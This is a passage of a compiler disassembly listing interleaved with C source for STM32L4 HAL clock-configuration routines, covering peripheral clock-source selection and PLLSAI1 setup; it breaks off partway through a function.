    __HAL_RCC_LPUART1_CONFIG(PeriphClkInit->Lpuart1ClockSelection);
 8004912:	4b73      	ldr	r3, [pc, #460]	; (8004ae0 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004914:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004918:	f423 6240 	bic.w	r2, r3, #3072	; 0xc00
 800491c:	687b      	ldr	r3, [r7, #4]
 800491e:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8004920:	496f      	ldr	r1, [pc, #444]	; (8004ae0 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004922:	4313      	orrs	r3, r2
 8004924:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- LPTIM1 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_LPTIM1) == (RCC_PERIPHCLK_LPTIM1))
 8004928:	687b      	ldr	r3, [r7, #4]
 800492a:	681b      	ldr	r3, [r3, #0]
 800492c:	f403 7300 	and.w	r3, r3, #512	; 0x200
 8004930:	2b00      	cmp	r3, #0
 8004932:	d00a      	beq.n	800494a <HAL_RCCEx_PeriphCLKConfig+0x252>
  {
    assert_param(IS_RCC_LPTIM1CLK(PeriphClkInit->Lptim1ClockSelection));
    __HAL_RCC_LPTIM1_CONFIG(PeriphClkInit->Lptim1ClockSelection);
 8004934:	4b6a      	ldr	r3, [pc, #424]	; (8004ae0 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004936:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800493a:	f423 2240 	bic.w	r2, r3, #786432	; 0xc0000
 800493e:	687b      	ldr	r3, [r7, #4]
 8004940:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 8004942:	4967      	ldr	r1, [pc, #412]	; (8004ae0 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004944:	4313      	orrs	r3, r2
 8004946:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- LPTIM2 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_LPTIM2) == (RCC_PERIPHCLK_LPTIM2))
 800494a:	687b      	ldr	r3, [r7, #4]
 800494c:	681b      	ldr	r3, [r3, #0]
 800494e:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8004952:	2b00      	cmp	r3, #0
 8004954:	d00a      	beq.n	800496c <HAL_RCCEx_PeriphCLKConfig+0x274>
  {
    assert_param(IS_RCC_LPTIM2CLK(PeriphClkInit->Lptim2ClockSelection));
    __HAL_RCC_LPTIM2_CONFIG(PeriphClkInit->Lptim2ClockSelection);
 8004956:	4b62      	ldr	r3, [pc, #392]	; (8004ae0 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004958:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800495c:	f423 1240 	bic.w	r2, r3, #3145728	; 0x300000
 8004960:	687b      	ldr	r3, [r7, #4]
 8004962:	6b9b      	ldr	r3, [r3, #56]	; 0x38
 8004964:	495e      	ldr	r1, [pc, #376]	; (8004ae0 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004966:	4313      	orrs	r3, r2
 8004968:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- I2C1 clock source configuration ---------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_I2C1) == RCC_PERIPHCLK_I2C1)
 800496c:	687b      	ldr	r3, [r7, #4]
 800496e:	681b      	ldr	r3, [r3, #0]
 8004970:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8004974:	2b00      	cmp	r3, #0
 8004976:	d00a      	beq.n	800498e <HAL_RCCEx_PeriphCLKConfig+0x296>
  {
    /* Check the parameters */
    assert_param(IS_RCC_I2C1CLKSOURCE(PeriphClkInit->I2c1ClockSelection));

    /* Configure the I2C1 clock source */
    __HAL_RCC_I2C1_CONFIG(PeriphClkInit->I2c1ClockSelection);
 8004978:	4b59      	ldr	r3, [pc, #356]	; (8004ae0 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 800497a:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800497e:	f423 5240 	bic.w	r2, r3, #12288	; 0x3000
 8004982:	687b      	ldr	r3, [r7, #4]
 8004984:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 8004986:	4956      	ldr	r1, [pc, #344]	; (8004ae0 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004988:	4313      	orrs	r3, r2
 800498a:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

#endif /* I2C2 */

  /*-------------------------- I2C3 clock source configuration ---------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_I2C3) == RCC_PERIPHCLK_I2C3)
 800498e:	687b      	ldr	r3, [r7, #4]
 8004990:	681b      	ldr	r3, [r3, #0]
 8004992:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8004996:	2b00      	cmp	r3, #0
 8004998:	d00a      	beq.n	80049b0 <HAL_RCCEx_PeriphCLKConfig+0x2b8>
  {
    /* Check the parameters */
    assert_param(IS_RCC_I2C3CLKSOURCE(PeriphClkInit->I2c3ClockSelection));

    /* Configure the I2C3 clock source */
    __HAL_RCC_I2C3_CONFIG(PeriphClkInit->I2c3ClockSelection);
 800499a:	4b51      	ldr	r3, [pc, #324]	; (8004ae0 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 800499c:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80049a0:	f423 3240 	bic.w	r2, r3, #196608	; 0x30000
 80049a4:	687b      	ldr	r3, [r7, #4]
 80049a6:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 80049a8:	494d      	ldr	r1, [pc, #308]	; (8004ae0 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80049aa:	4313      	orrs	r3, r2
 80049ac:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
#endif /* I2C4 */

#if defined(USB_OTG_FS) || defined(USB)

  /*-------------------------- USB clock source configuration ----------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_USB) == (RCC_PERIPHCLK_USB))
 80049b0:	687b      	ldr	r3, [r7, #4]
 80049b2:	681b      	ldr	r3, [r3, #0]
 80049b4:	f403 5300 	and.w	r3, r3, #8192	; 0x2000
 80049b8:	2b00      	cmp	r3, #0
 80049ba:	d028      	beq.n	8004a0e <HAL_RCCEx_PeriphCLKConfig+0x316>
  {
    assert_param(IS_RCC_USBCLKSOURCE(PeriphClkInit->UsbClockSelection));
    __HAL_RCC_USB_CONFIG(PeriphClkInit->UsbClockSelection);
 80049bc:	4b48      	ldr	r3, [pc, #288]	; (8004ae0 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80049be:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80049c2:	f023 6240 	bic.w	r2, r3, #201326592	; 0xc000000
 80049c6:	687b      	ldr	r3, [r7, #4]
 80049c8:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 80049ca:	4945      	ldr	r1, [pc, #276]	; (8004ae0 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80049cc:	4313      	orrs	r3, r2
 80049ce:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88

    if(PeriphClkInit->UsbClockSelection == RCC_USBCLKSOURCE_PLL)
 80049d2:	687b      	ldr	r3, [r7, #4]
 80049d4:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 80049d6:	f1b3 6f00 	cmp.w	r3, #134217728	; 0x8000000
 80049da:	d106      	bne.n	80049ea <HAL_RCCEx_PeriphCLKConfig+0x2f2>
    {
      /* Enable PLL48M1CLK output clock */
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_48M1CLK);
 80049dc:	4b40      	ldr	r3, [pc, #256]	; (8004ae0 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80049de:	68db      	ldr	r3, [r3, #12]
 80049e0:	4a3f      	ldr	r2, [pc, #252]	; (8004ae0 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80049e2:	f443 1380 	orr.w	r3, r3, #1048576	; 0x100000
 80049e6:	60d3      	str	r3, [r2, #12]
 80049e8:	e011      	b.n	8004a0e <HAL_RCCEx_PeriphCLKConfig+0x316>
    }
    else
    {
#if defined(RCC_PLLSAI1_SUPPORT)
      if(PeriphClkInit->UsbClockSelection == RCC_USBCLKSOURCE_PLLSAI1)
 80049ea:	687b      	ldr	r3, [r7, #4]
 80049ec:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 80049ee:	f1b3 6f80 	cmp.w	r3, #67108864	; 0x4000000
 80049f2:	d10c      	bne.n	8004a0e <HAL_RCCEx_PeriphCLKConfig+0x316>
      {
        /* PLLSAI1 input clock, parameters M, N & Q configuration and clock output (PLLSAI1ClockOut) */
        ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_Q_UPDATE);
 80049f4:	687b      	ldr	r3, [r7, #4]
 80049f6:	3304      	adds	r3, #4
 80049f8:	2101      	movs	r1, #1
 80049fa:	4618      	mov	r0, r3
 80049fc:	f000 f882 	bl	8004b04 <RCCEx_PLLSAI1_Config>
 8004a00:	4603      	mov	r3, r0
 8004a02:	74fb      	strb	r3, [r7, #19]

        if(ret != HAL_OK)
 8004a04:	7cfb      	ldrb	r3, [r7, #19]
 8004a06:	2b00      	cmp	r3, #0
 8004a08:	d001      	beq.n	8004a0e <HAL_RCCEx_PeriphCLKConfig+0x316>
        {
          /* set overall return value */
          status = ret;
 8004a0a:	7cfb      	ldrb	r3, [r7, #19]
 8004a0c:	74bb      	strb	r3, [r7, #18]
  }

#endif /* SDMMC1 */

  /*-------------------------- RNG clock source configuration ----------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_RNG) == (RCC_PERIPHCLK_RNG))
 8004a0e:	687b      	ldr	r3, [r7, #4]
 8004a10:	681b      	ldr	r3, [r3, #0]
 8004a12:	f403 2380 	and.w	r3, r3, #262144	; 0x40000
 8004a16:	2b00      	cmp	r3, #0
 8004a18:	d028      	beq.n	8004a6c <HAL_RCCEx_PeriphCLKConfig+0x374>
  {
    assert_param(IS_RCC_RNGCLKSOURCE(PeriphClkInit->RngClockSelection));
    __HAL_RCC_RNG_CONFIG(PeriphClkInit->RngClockSelection);
 8004a1a:	4b31      	ldr	r3, [pc, #196]	; (8004ae0 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004a1c:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004a20:	f023 6240 	bic.w	r2, r3, #201326592	; 0xc000000
 8004a24:	687b      	ldr	r3, [r7, #4]
 8004a26:	6c5b      	ldr	r3, [r3, #68]	; 0x44
 8004a28:	492d      	ldr	r1, [pc, #180]	; (8004ae0 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004a2a:	4313      	orrs	r3, r2
 8004a2c:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88

    if(PeriphClkInit->RngClockSelection == RCC_RNGCLKSOURCE_PLL)
 8004a30:	687b      	ldr	r3, [r7, #4]
 8004a32:	6c5b      	ldr	r3, [r3, #68]	; 0x44
 8004a34:	f1b3 6f00 	cmp.w	r3, #134217728	; 0x8000000
 8004a38:	d106      	bne.n	8004a48 <HAL_RCCEx_PeriphCLKConfig+0x350>
    {
      /* Enable PLL48M1CLK output clock */
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_48M1CLK);
 8004a3a:	4b29      	ldr	r3, [pc, #164]	; (8004ae0 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004a3c:	68db      	ldr	r3, [r3, #12]
 8004a3e:	4a28      	ldr	r2, [pc, #160]	; (8004ae0 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004a40:	f443 1380 	orr.w	r3, r3, #1048576	; 0x100000
 8004a44:	60d3      	str	r3, [r2, #12]
 8004a46:	e011      	b.n	8004a6c <HAL_RCCEx_PeriphCLKConfig+0x374>
    }
#if defined(RCC_PLLSAI1_SUPPORT)
    else if(PeriphClkInit->RngClockSelection == RCC_RNGCLKSOURCE_PLLSAI1)
 8004a48:	687b      	ldr	r3, [r7, #4]
 8004a4a:	6c5b      	ldr	r3, [r3, #68]	; 0x44
 8004a4c:	f1b3 6f80 	cmp.w	r3, #67108864	; 0x4000000
 8004a50:	d10c      	bne.n	8004a6c <HAL_RCCEx_PeriphCLKConfig+0x374>
    {
      /* PLLSAI1 input clock, parameters M, N & Q configuration and clock output (PLLSAI1ClockOut) */
      ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_Q_UPDATE);
 8004a52:	687b      	ldr	r3, [r7, #4]
 8004a54:	3304      	adds	r3, #4
 8004a56:	2101      	movs	r1, #1
 8004a58:	4618      	mov	r0, r3
 8004a5a:	f000 f853 	bl	8004b04 <RCCEx_PLLSAI1_Config>
 8004a5e:	4603      	mov	r3, r0
 8004a60:	74fb      	strb	r3, [r7, #19]

      if(ret != HAL_OK)
 8004a62:	7cfb      	ldrb	r3, [r7, #19]
 8004a64:	2b00      	cmp	r3, #0
 8004a66:	d001      	beq.n	8004a6c <HAL_RCCEx_PeriphCLKConfig+0x374>
      {
        /* set overall return value */
        status = ret;
 8004a68:	7cfb      	ldrb	r3, [r7, #19]
 8004a6a:	74bb      	strb	r3, [r7, #18]
    }
  }

  /*-------------------------- ADC clock source configuration ----------------------*/
#if !defined(STM32L412xx) && !defined(STM32L422xx)
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_ADC) == RCC_PERIPHCLK_ADC)
 8004a6c:	687b      	ldr	r3, [r7, #4]
 8004a6e:	681b      	ldr	r3, [r3, #0]
 8004a70:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8004a74:	2b00      	cmp	r3, #0
 8004a76:	d01c      	beq.n	8004ab2 <HAL_RCCEx_PeriphCLKConfig+0x3ba>
  {
    /* Check the parameters */
    assert_param(IS_RCC_ADCCLKSOURCE(PeriphClkInit->AdcClockSelection));

    /* Configure the ADC interface clock source */
    __HAL_RCC_ADC_CONFIG(PeriphClkInit->AdcClockSelection);
 8004a78:	4b19      	ldr	r3, [pc, #100]	; (8004ae0 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004a7a:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004a7e:	f023 5240 	bic.w	r2, r3, #805306368	; 0x30000000
 8004a82:	687b      	ldr	r3, [r7, #4]
 8004a84:	6c9b      	ldr	r3, [r3, #72]	; 0x48
 8004a86:	4916      	ldr	r1, [pc, #88]	; (8004ae0 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004a88:	4313      	orrs	r3, r2
 8004a8a:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88

#if defined(RCC_PLLSAI1_SUPPORT)
    if(PeriphClkInit->AdcClockSelection == RCC_ADCCLKSOURCE_PLLSAI1)
 8004a8e:	687b      	ldr	r3, [r7, #4]
 8004a90:	6c9b      	ldr	r3, [r3, #72]	; 0x48
 8004a92:	f1b3 5f80 	cmp.w	r3, #268435456	; 0x10000000
 8004a96:	d10c      	bne.n	8004ab2 <HAL_RCCEx_PeriphCLKConfig+0x3ba>
    {
      /* PLLSAI1 input clock, parameters M, N & R configuration and clock output (PLLSAI1ClockOut) */
      ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_R_UPDATE);
 8004a98:	687b      	ldr	r3, [r7, #4]
 8004a9a:	3304      	adds	r3, #4
 8004a9c:	2102      	movs	r1, #2
 8004a9e:	4618      	mov	r0, r3
 8004aa0:	f000 f830 	bl	8004b04 <RCCEx_PLLSAI1_Config>
 8004aa4:	4603      	mov	r3, r0
 8004aa6:	74fb      	strb	r3, [r7, #19]

      if(ret != HAL_OK)
 8004aa8:	7cfb      	ldrb	r3, [r7, #19]
 8004aaa:	2b00      	cmp	r3, #0
 8004aac:	d001      	beq.n	8004ab2 <HAL_RCCEx_PeriphCLKConfig+0x3ba>
      {
        /* set overall return value */
        status = ret;
 8004aae:	7cfb      	ldrb	r3, [r7, #19]
 8004ab0:	74bb      	strb	r3, [r7, #18]
#endif /* !STM32L412xx && !STM32L422xx */

#if defined(SWPMI1)

  /*-------------------------- SWPMI1 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_SWPMI1) == RCC_PERIPHCLK_SWPMI1)
 8004ab2:	687b      	ldr	r3, [r7, #4]
 8004ab4:	681b      	ldr	r3, [r3, #0]
 8004ab6:	f403 4300 	and.w	r3, r3, #32768	; 0x8000
 8004aba:	2b00      	cmp	r3, #0
 8004abc:	d00a      	beq.n	8004ad4 <HAL_RCCEx_PeriphCLKConfig+0x3dc>
  {
    /* Check the parameters */
    assert_param(IS_RCC_SWPMI1CLKSOURCE(PeriphClkInit->Swpmi1ClockSelection));

    /* Configure the SWPMI1 clock source */
    __HAL_RCC_SWPMI1_CONFIG(PeriphClkInit->Swpmi1ClockSelection);
 8004abe:	4b08      	ldr	r3, [pc, #32]	; (8004ae0 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004ac0:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004ac4:	f023 4280 	bic.w	r2, r3, #1073741824	; 0x40000000
 8004ac8:	687b      	ldr	r3, [r7, #4]
 8004aca:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8004acc:	4904      	ldr	r1, [pc, #16]	; (8004ae0 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004ace:	4313      	orrs	r3, r2
 8004ad0:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
    }
  }

#endif /* OCTOSPI1 || OCTOSPI2 */

  return status;
 8004ad4:	7cbb      	ldrb	r3, [r7, #18]
}
 8004ad6:	4618      	mov	r0, r3
 8004ad8:	3718      	adds	r7, #24
 8004ada:	46bd      	mov	sp, r7
 8004adc:	bd80      	pop	{r7, pc}
 8004ade:	bf00      	nop
 8004ae0:	40021000 	.word	0x40021000

08004ae4 <HAL_RCCEx_EnableMSIPLLMode>:
  * @note   Prior to enable the PLL-mode of the MSI for automatic hardware
  *         calibration LSE oscillator is to be enabled with HAL_RCC_OscConfig().
  * @retval None
  */
void HAL_RCCEx_EnableMSIPLLMode(void)
{
 8004ae4:	b480      	push	{r7}
 8004ae6:	af00      	add	r7, sp, #0
  SET_BIT(RCC->CR, RCC_CR_MSIPLLEN) ;
 8004ae8:	4b05      	ldr	r3, [pc, #20]	; (8004b00 <HAL_RCCEx_EnableMSIPLLMode+0x1c>)
 8004aea:	681b      	ldr	r3, [r3, #0]
 8004aec:	4a04      	ldr	r2, [pc, #16]	; (8004b00 <HAL_RCCEx_EnableMSIPLLMode+0x1c>)
 8004aee:	f043 0304 	orr.w	r3, r3, #4
 8004af2:	6013      	str	r3, [r2, #0]
}
 8004af4:	bf00      	nop
 8004af6:	46bd      	mov	sp, r7
 8004af8:	f85d 7b04 	ldr.w	r7, [sp], #4
 8004afc:	4770      	bx	lr
 8004afe:	bf00      	nop
 8004b00:	40021000 	.word	0x40021000

08004b04 <RCCEx_PLLSAI1_Config>:
  * @note   PLLSAI1 is temporary disable to apply new parameters
  *
  * @retval HAL status
  */
static HAL_StatusTypeDef RCCEx_PLLSAI1_Config(RCC_PLLSAI1InitTypeDef *PllSai1, uint32_t Divider)
{
 8004b04:	b580      	push	{r7, lr}
 8004b06:	b084      	sub	sp, #16
 8004b08:	af00      	add	r7, sp, #0
 8004b0a:	6078      	str	r0, [r7, #4]
 8004b0c:	6039      	str	r1, [r7, #0]
  uint32_t tickstart;
  HAL_StatusTypeDef status = HAL_OK;
 8004b0e:	2300      	movs	r3, #0
 8004b10:	73fb      	strb	r3, [r7, #15]
  assert_param(IS_RCC_PLLSAI1M_VALUE(PllSai1->PLLSAI1M));
  assert_param(IS_RCC_PLLSAI1N_VALUE(PllSai1->PLLSAI1N));
  assert_param(IS_RCC_PLLSAI1CLOCKOUT_VALUE(PllSai1->PLLSAI1ClockOut));

  /* Check that PLLSAI1 clock source and divider M can be applied */
  if(__HAL_RCC_GET_PLL_OSCSOURCE() != RCC_PLLSOURCE_NONE)
 8004b12:	4b74      	ldr	r3, [pc, #464]	; (8004ce4 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004b14:	68db      	ldr	r3, [r3, #12]
 8004b16:	f003 0303 	and.w	r3, r3, #3
 8004b1a:	2b00      	cmp	r3, #0
 8004b1c:	d018      	beq.n	8004b50 <RCCEx_PLLSAI1_Config+0x4c>
  {
    /* PLL clock source and divider M already set, check that no request for change  */
    if((__HAL_RCC_GET_PLL_OSCSOURCE() != PllSai1->PLLSAI1Source)
 8004b1e:	4b71      	ldr	r3, [pc, #452]	; (8004ce4 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004b20:	68db      	ldr	r3, [r3, #12]
 8004b22:	f003 0203 	and.w	r2, r3, #3
 8004b26:	687b      	ldr	r3, [r7, #4]
 8004b28:	681b      	ldr	r3, [r3, #0]
 8004b2a:	429a      	cmp	r2, r3
 8004b2c:	d10d      	bne.n	8004b4a <RCCEx_PLLSAI1_Config+0x46>
       ||
       (PllSai1->PLLSAI1Source == RCC_PLLSOURCE_NONE)
 8004b2e:	687b      	ldr	r3, [r7, #4]
 8004b30:	681b      	ldr	r3, [r3, #0]
       ||
 8004b32:	2b00      	cmp	r3, #0
 8004b34:	d009      	beq.n	8004b4a <RCCEx_PLLSAI1_Config+0x46>
#if !defined(RCC_PLLSAI1M_DIV_1_16_SUPPORT)
       ||
       (((READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLM) >> RCC_PLLCFGR_PLLM_Pos) + 1U) != PllSai1->PLLSAI1M)
 8004b36:	4b6b      	ldr	r3, [pc, #428]	; (8004ce4 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004b38:	68db      	ldr	r3, [r3, #12]
 8004b3a:	091b      	lsrs	r3, r3, #4
 8004b3c:	f003 0307 	and.w	r3, r3, #7
 8004b40:	1c5a      	adds	r2, r3, #1
 8004b42:	687b      	ldr	r3, [r7, #4]
 8004b44:	685b      	ldr	r3, [r3, #4]
       ||
 8004b46:	429a      	cmp	r2, r3
 8004b48:	d047      	beq.n	8004bda <RCCEx_PLLSAI1_Config+0xd6>
#endif
      )
    {
      status = HAL_ERROR;
 8004b4a:	2301      	movs	r3, #1
 8004b4c:	73fb      	strb	r3, [r7, #15]
 8004b4e:	e044      	b.n	8004bda <RCCEx_PLLSAI1_Config+0xd6>
    }
  }
  else
  {
    /* Check PLLSAI1 clock source availability */
    switch(PllSai1->PLLSAI1Source)
 8004b50:	687b      	ldr	r3, [r7, #4]
 8004b52:	681b      	ldr	r3, [r3, #0]
 8004b54:	2b03      	cmp	r3, #3
 8004b56:	d018      	beq.n	8004b8a <RCCEx_PLLSAI1_Config+0x86>
 8004b58:	2b03      	cmp	r3, #3
 8004b5a:	d825      	bhi.n	8004ba8 <RCCEx_PLLSAI1_Config+0xa4>
 8004b5c:	2b01      	cmp	r3, #1
 8004b5e:	d002      	beq.n	8004b66 <RCCEx_PLLSAI1_Config+0x62>
 8004b60:	2b02      	cmp	r3, #2
 8004b62:	d009      	beq.n	8004b78 <RCCEx_PLLSAI1_Config+0x74>
 8004b64:	e020      	b.n	8004ba8 <RCCEx_PLLSAI1_Config+0xa4>
    {
    case RCC_PLLSOURCE_MSI:
      if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_MSIRDY))
 8004b66:	4b5f      	ldr	r3, [pc, #380]	; (8004ce4 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004b68:	681b      	ldr	r3, [r3, #0]
 8004b6a:	f003 0302 	and.w	r3, r3, #2
 8004b6e:	2b00      	cmp	r3, #0
 8004b70:	d11d      	bne.n	8004bae <RCCEx_PLLSAI1_Config+0xaa>
      {
        status = HAL_ERROR;
 8004b72:	2301      	movs	r3, #1
 8004b74:	73fb      	strb	r3, [r7, #15]
      }
      break;
 8004b76:	e01a      	b.n	8004bae <RCCEx_PLLSAI1_Config+0xaa>
    case RCC_PLLSOURCE_HSI:
      if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_HSIRDY))
 8004b78:	4b5a      	ldr	r3, [pc, #360]	; (8004ce4 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004b7a:	681b      	ldr	r3, [r3, #0]
 8004b7c:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8004b80:	2b00      	cmp	r3, #0
 8004b82:	d116      	bne.n	8004bb2 <RCCEx_PLLSAI1_Config+0xae>
      {
        status = HAL_ERROR;
 8004b84:	2301      	movs	r3, #1
 8004b86:	73fb      	strb	r3, [r7, #15]
      }
      break;
 8004b88:	e013      	b.n	8004bb2 <RCCEx_PLLSAI1_Config+0xae>
    case RCC_PLLSOURCE_HSE:
      if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_HSERDY))
 8004b8a:	4b56      	ldr	r3, [pc, #344]	; (8004ce4 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004b8c:	681b      	ldr	r3, [r3, #0]
 8004b8e:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8004b92:	2b00      	cmp	r3, #0
 8004b94:	d10f      	bne.n	8004bb6 <RCCEx_PLLSAI1_Config+0xb2>
      {
        if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_HSEBYP))
 8004b96:	4b53      	ldr	r3, [pc, #332]	; (8004ce4 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004b98:	681b      	ldr	r3, [r3, #0]
 8004b9a:	f403 2380 	and.w	r3, r3, #262144	; 0x40000
 8004b9e:	2b00      	cmp	r3, #0
 8004ba0:	d109      	bne.n	8004bb6 <RCCEx_PLLSAI1_Config+0xb2>
        {
          status = HAL_ERROR;
 8004ba2:	2301      	movs	r3, #1
 8004ba4:	73fb      	strb	r3, [r7, #15]
        }
      }
      break;
 8004ba6:	e006      	b.n	8004bb6 <RCCEx_PLLSAI1_Config+0xb2>
    default:
      status = HAL_ERROR;
 8004ba8:	2301      	movs	r3, #1
 8004baa:	73fb      	strb	r3, [r7, #15]
      break;
 8004bac:	e004      	b.n	8004bb8 <RCCEx_PLLSAI1_Config+0xb4>
      break;
 8004bae:	bf00      	nop
 8004bb0:	e002      	b.n	8004bb8 <RCCEx_PLLSAI1_Config+0xb4>
      break;
 8004bb2:	bf00      	nop
 8004bb4:	e000      	b.n	8004bb8 <RCCEx_PLLSAI1_Config+0xb4>
      break;
 8004bb6:	bf00      	nop
    }

    if(status == HAL_OK)
 8004bb8:	7bfb      	ldrb	r3, [r7, #15]
 8004bba:	2b00      	cmp	r3, #0
 8004bbc:	d10d      	bne.n	8004bda <RCCEx_PLLSAI1_Config+0xd6>
#if defined(RCC_PLLSAI1M_DIV_1_16_SUPPORT)
      /* Set PLLSAI1 clock source */
      MODIFY_REG(RCC->PLLCFGR, RCC_PLLCFGR_PLLSRC, PllSai1->PLLSAI1Source);
#else
      /* Set PLLSAI1 clock source and divider M */
      MODIFY_REG(RCC->PLLCFGR, RCC_PLLCFGR_PLLSRC | RCC_PLLCFGR_PLLM, PllSai1->PLLSAI1Source | (PllSai1->PLLSAI1M - 1U) << RCC_PLLCFGR_PLLM_Pos);
 8004bbe:	4b49      	ldr	r3, [pc, #292]	; (8004ce4 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004bc0:	68db      	ldr	r3, [r3, #12]
 8004bc2:	f023 0273 	bic.w	r2, r3, #115	; 0x73
 8004bc6:	687b      	ldr	r3, [r7, #4]
 8004bc8:	6819      	ldr	r1, [r3, #0]
 8004bca:	687b      	ldr	r3, [r7, #4]
 8004bcc:	685b      	ldr	r3, [r3, #4]
 8004bce:	3b01      	subs	r3, #1
 8004bd0:	011b      	lsls	r3, r3, #4
 8004bd2:	430b      	orrs	r3, r1
 8004bd4:	4943      	ldr	r1, [pc, #268]	; (8004ce4 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004bd6:	4313      	orrs	r3, r2
 8004bd8:	60cb      	str	r3, [r1, #12]
#endif
    }
  }

  if(status == HAL_OK)
 8004bda:	7bfb      	ldrb	r3, [r7, #15]
 8004bdc:	2b00      	cmp	r3, #0
 8004bde:	d17c      	bne.n	8004cda <RCCEx_PLLSAI1_Config+0x1d6>
  {
    /* Disable the PLLSAI1 */
    __HAL_RCC_PLLSAI1_DISABLE();
 8004be0:	4b40      	ldr	r3, [pc, #256]	; (8004ce4 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004be2:	681b      	ldr	r3, [r3, #0]
 8004be4:	4a3f      	ldr	r2, [pc, #252]	; (8004ce4 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004be6:	f023 6380 	bic.w	r3, r3, #67108864	; 0x4000000
 8004bea:	6013      	str	r3, [r2, #0]

    /* Get Start Tick*/
    tickstart = HAL_GetTick();
 8004bec:	f7fc fbc8 	bl	8001380 <HAL_GetTick>
 8004bf0:	60b8      	str	r0, [r7, #8]

    /* Wait till PLLSAI1 is ready to be updated */
    while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) != 0U)
 8004bf2:	e009      	b.n	8004c08 <RCCEx_PLLSAI1_Config+0x104>
    {
      if((HAL_GetTick() - tickstart) > PLLSAI1_TIMEOUT_VALUE)
 8004bf4:	f7fc fbc4 	bl	8001380 <HAL_GetTick>
 8004bf8:	4602      	mov	r2, r0
 8004bfa:	68bb      	ldr	r3, [r7, #8]
 8004bfc:	1ad3      	subs	r3, r2, r3
